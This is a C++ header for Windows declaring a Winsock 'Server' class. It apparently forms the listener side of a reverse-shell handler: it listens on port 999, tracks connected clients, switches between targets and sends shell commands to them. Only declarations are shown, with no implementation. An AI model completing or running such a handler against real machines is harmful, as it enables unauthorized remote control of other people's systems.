#pragma once

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
//#include <string>

class Server
{
public:
    // i understand this isnt ideal, we'll sort something out
    HANDLE thread1_handle, thread2_handle;

public:
    // SOCKET FUNCTIONS //
    int server_free();
    void init();
    void create_socket();
    void bind_socket();
    void accept_connections();

    // HANDLER //
    void start_handler();
    void handler_print_help();
    int list_connections();
    int change_target(unsigned short target);

    // SHELL //
    int send_commands();

private:
    const wchar_t* lport = L"999";

    int iResult = 0;
    bool bRunning = true;

    // sockets
    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;

    // address info
    ADDRINFOW* addrInfo = NULL;
    ADDRINFOW hints;

    // send and receive vars
    char inputUser[1024];
    char rdata[18384];

    // hold connected sockets
    std::vector<SOCKET> connections;

    // ascii color codes
    const wchar_t* failed = L"\x1B[38;5;2m[+]\033[0m: ";
    const wchar_t* warn = L"\x1B[38;5;3m[!]\033[0m: ";
    const wchar_t* success = L"\x1B[38;5;2m[+]\033[0m: ";
};